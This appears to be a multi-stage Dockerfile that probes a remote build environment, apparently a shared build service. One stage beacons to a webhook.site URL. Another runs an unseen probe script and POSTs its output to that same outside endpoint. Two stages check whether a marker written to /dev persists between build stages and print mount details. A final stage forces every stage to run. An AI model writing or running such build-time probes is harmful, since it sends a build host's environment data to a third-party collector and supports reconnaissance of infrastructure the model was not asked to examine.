FROM alpine:3.20 AS ctl
RUN apk add --no-cache curl >/dev/null 2>&1; echo "F2-CONTROL6A $(date -u)" | curl -sS -m 20 -X POST --data-binary @- https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8

FROM alpine:3.20 AS devfs
RUN echo f2marker > /dev/f2marker && ls -la /dev/f2marker

FROM alpine:3.20 AS devfs2
COPY --from=devfs /etc/hostname /x
RUN echo "F2-DEV-PERSIST: $( [ -e /dev/f2marker ] && echo yes || echo no-tmpfs )"; mount | grep -E " /dev " || true

FROM alpine:3.20 AS probe2
RUN apk add --no-cache curl >/dev/null 2>&1
COPY front2/scripts/front2_build_probe2 /probe2
RUN chmod +x /probe2 && /probe2 > /f2p2.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2p2.txt https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; cat /f2p2.txt

FROM alpine:3.20 AS collect
COPY --from=ctl /etc/hostname /c
COPY --from=devfs2 /etc/hostname /d
COPY --from=probe2 /etc/hostname /p
RUN echo F2-BATCH6A-DONE
